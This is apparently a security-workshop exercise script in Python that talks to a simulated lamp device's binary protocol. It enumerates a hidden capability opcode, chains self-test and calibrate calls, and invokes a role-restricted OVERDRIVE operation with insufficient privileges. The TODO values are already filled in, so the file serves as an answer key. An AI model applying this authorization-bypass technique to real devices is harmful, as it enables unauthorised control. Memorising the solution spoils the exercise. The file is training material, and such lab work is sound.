"""Enumerate the device, find the operation you are not allowed to use, and show the
server runs it anyway. Fill the two TODOs (recover them from controller.exe + GET_CAPS).
Run: python workshop.py --host 127.0.0.1 --port 9004"""

import argparse
import socket
import struct

from wire import ProtocolError, encode, receive

HELLO, STATUS, SELF_TEST, CALIBRATE = 0x01, 0x10, 0x20, 0x21

# TODO 1: the hidden capability command (find it by reversing controller.exe).
GET_CAPS = 0x11
# TODO 2: the operation GET_CAPS reports needs role 2.
OVERDRIVE = 0x30


class Lamp:
    def __init__(self, host, port):
        self.sequence = 0
        self.sock = socket.create_connection((host, port), timeout=5)
        self._request(HELLO)

    def close(self):
        self.sock.close()

    def _request(self, opcode, payload=b""):
        self.sequence = (self.sequence + 1) & 0xFFFF
        self.sock.sendall(encode(opcode, self.sequence, payload))
        reply = receive(self.sock)
        if reply.opcode == 0xFF:
            raise ProtocolError(reply.payload.decode("utf-8", "replace"))
        return reply.payload

    def status(self):
        state, role, brightness = self._request(STATUS)
        return state, role, brightness

    def caps(self):
        data = self._request(GET_CAPS)
        count = data[0]
        return [(data[1 + i * 2], data[2 + i * 2]) for i in range(count)]

    def self_test(self):
        return struct.unpack("<I", self._request(SELF_TEST))[0]

    def calibrate(self, test_id):
        return struct.unpack(
            "<I", self._request(CALIBRATE, struct.pack("<I", test_id))
        )[0]

    def overdrive(self, calib_id):
        return self._request(OVERDRIVE, struct.pack("<I", calib_id)).decode(
            "utf-8", "replace"
        )


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=9004)
    args = parser.parse_args()
    if GET_CAPS is None or OVERDRIVE is None:
        raise SystemExit("Fill the two TODOs first.")

    lamp = Lamp(args.host, args.port)
    try:
        print("your status (state, role, brightness):", lamp.status())
        print("capabilities (op -> required role):")
        for op, role in lamp.caps():
            print("  op %02x -> role %d" % (op, role))
        test_id = lamp.self_test()
        calib_id = lamp.calibrate(test_id)
        print("reached:", lamp.status())
        print("OVERDRIVE as role 1 ->", lamp.overdrive(calib_id))
    finally:
        lamp.close()


if __name__ == "__main__":
    main()
